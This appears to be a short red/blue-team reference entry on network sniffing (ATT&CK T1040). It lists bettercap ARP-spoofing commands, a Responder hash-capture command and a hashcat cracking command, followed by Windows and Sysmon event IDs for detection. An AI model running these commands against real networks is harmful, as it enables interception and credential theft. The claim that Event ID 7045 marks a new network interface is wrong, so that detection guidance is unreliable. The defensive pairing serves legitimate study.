
## T1040 Network Sniffing

bettercap

```kali
bettercap -iface eth0 

arp.spoof on

net.sniff on

net.probe on

set arp.spoof.targets  192.168.100.5
```

  

responder

```kali
responder -I eth1 -Fwvb
```

hashcat

```kali
Hashcat  hash.txt rockyou.txt
```

  

Windows Event Viewer:

  

- Event ID 7045 (Windows Server 2008 and later): A new network interface was created, which could indicate an adversary attempting to sniff network traffic using a new interface.

  

Sysmon:

  

- Event ID 3 - Network connections: Monitor for network connections made by processes associated with network sniffing tools or unusual network activity, especially those connecting to internal systems or using non-standard network protocols.

- Event ID 5 - Process terminated: Monitor for termination of network monitoring or security tools, which could indicate an adversary trying to disable monitoring or hide their activity.

- Event ID 10 - Process accessed: Monitor for processes accessing network-related processes or services, such as network drivers or monitoring tools.